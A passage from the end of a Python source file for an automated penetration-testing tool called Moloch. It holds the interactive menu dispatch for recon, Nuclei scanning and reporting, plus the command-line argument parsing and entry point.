        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Configuration and management
        print("║\033[1;90m  7.\033[0m ⚙️  \033[1;97mSYSTEM CONFIGURATION\033[0m - Settings and tool management             ║")
        print("║      \033[1;90m7.1\033[0m 🔧 Framework Settings & Configuration                         ║")
        print("║      \033[1;90m7.2\033[0m 📋 Tool Status & Health Check                                ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Reporting and exit
        print("║\033[1;91m  8.\033[0m 📊 \033[1;97mGENERATE SECURITY REPORT\033[0m - Professional assessment reports       ║")
        print("║\033[1;92m  9.\033[0m 🚪 \033[1;97mEXIT FRAMEWORK\033[0m - Save session and exit                          ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")
        
        print(f"\033[1;90m💡 Tip: Use menu numbers (e.g., '3.1') for direct access to sub-functions\033[0m")
        choice = input("\n\033[1;93m🎯 Select an option: \033[0m").strip()

        if choice == '1':
            success = run_full_pipeline()
            if success:
                print("\n\033[92m✅ Full pipeline completed successfully.\033[0m")
            else:
                print("\n\033[91m❌ Full pipeline encountered errors.\033[0m")
            input("\nPress Enter to continue...")
        elif choice == '2':
            target_management_menu()
        elif choice == '3.1':
            # Subdomain Discovery
            targets = read_lines(TARGETS_FILE)
            if not targets:
                print("No targets found. Please add targets first.")
                input("Press Enter to continue...")
                continue
            run_dir = new_run()
            config = load_config()
            for target in targets:
                run_subdomain_discovery(target, run_dir / "subdomains", config)
            input("Subdomain discovery tasks initiated. Check the run directory. Press Enter to continue...")
        elif choice == '4.1':
            # Nuclei Scan
            targets = read_lines(TARGETS_FILE)
            if not targets:
                print("No targets found. Please add targets first.")
                input("Press Enter to continue...")
                continue
            run_dir = new_run()
            live_hosts_files = list((run_dir.parent).glob("*/hosts/live_*.txt")) # Find recent live hosts
            if not live_hosts_files:
                print("No live hosts files found from previous recon. Run recon first.")
                input("Press Enter to continue...")
                continue
            config = load_config()
            for host_file in live_hosts_files[-3:]: # Scan last 3 recon runs
                 run_vulnerability_scan(host_file, run_dir / "vulns", config)
            input("Nuclei scan tasks initiated. Check the run directory. Press Enter to continue...")
        elif choice == '7.1':
            settings_menu()
        elif choice == '7.2':
            tool_status_menu()
        elif choice == '8':
            # Generate Report (for latest run)
            runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=os.path.getmtime, reverse=True)
            if runs:
                latest_run = runs[0]
                print(f"Generating report for latest run: {latest_run.name}")
                config = load_config()
                success = generate_simple_report(latest_run, config)
                if success:
                    print("\n\033[92m✅ Report generated successfully.\033[0m")
                else:
                    print("\n\033[91m❌ Report generation failed.\033[0m")
            else:
                print("No runs found to generate a report for.")
            input("Press Enter to continue...")
        elif choice == '9':
            print("Exiting Moloch. Goodbye!")
            sys.exit(0)
        else:
            print("\n\033[1;91m❌ Invalid choice. Please try a valid option (1-9, 3.1-3.3, 4.1-4.3, 5.1-5.2, 6.1, 7.1-7.2).\033[0m")
            input("Press Enter to continue...")

# --- CLI Argument Parsing ---
def setup_argument_parser() -> argparse.ArgumentParser:
    """Setup command-line argument parser."""
    parser = argparse.ArgumentParser(
        description=f"{APP} - Advanced Automated Penetration Testing Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
Examples:
  python3 {Path(__file__).name}                    # Run interactive menu
  python3 {Path(__file__).name} -t example.com     # Add target and run interactive menu
  python3 {Path(__file__).name} -t example.com --run-full # Add target and run full pipeline
  python3 {Path(__file__).name} --init             # Initialize environment only
        """
    )
    parser.add_argument("--target", "-t", help="Add a single target to targets.txt")
    parser.add_argument("--config", "-c", help="Path to configuration file (default: moloch.cfg.json)")
    parser.add_argument("--run-full", "-f", action="store_true", help="Run the full automation pipeline immediately")
    parser.add_argument("--init", action="store_true", help="Initialize environment (directories, wordlists, dependencies) and exit")
    parser.add_argument("--version", "-v", action="version", version=f"{APP} {VERSION}")
    return parser

# --- Entry Point ---
if __name__ == "__main__":
    # Ensure environment is set up first if requested or if running for the first time
    if "--init" in sys.argv or not CFG_FILE.exists():
        initialize_environment()

    parser = setup_argument_parser()
    args = parser.parse_args()

    if args.config:
        # Override default config file path if provided
        CFG_FILE = Path(args.config)

    if args.target:
        # Add single target to targets file if provided via CLI
        targets = read_lines(TARGETS_FILE)
        # Basic validation
        if "." in args.target and " " not in args.target and not args.target.startswith(("http://", "https://")):
            if args.target not in targets:
                targets.append(args.target)
                write_lines(TARGETS_FILE, targets)
                logger.info(f"Target {args.target} added via CLI.")
            else:
                logger.info(f"Target {args.target} already exists in targets.txt.")
        else:
            logger.error(f"Invalid target format provided via CLI: {args.target}")

    if args.init:
        logger.info(f"{APP} environment initialized.")
        print(f"{APP} environment initialized.")
        sys.exit(0)

    if args.run_full:
        success = run_full_pipeline()
        sys.exit(0 if success else 1)
    else:
        main_menu()
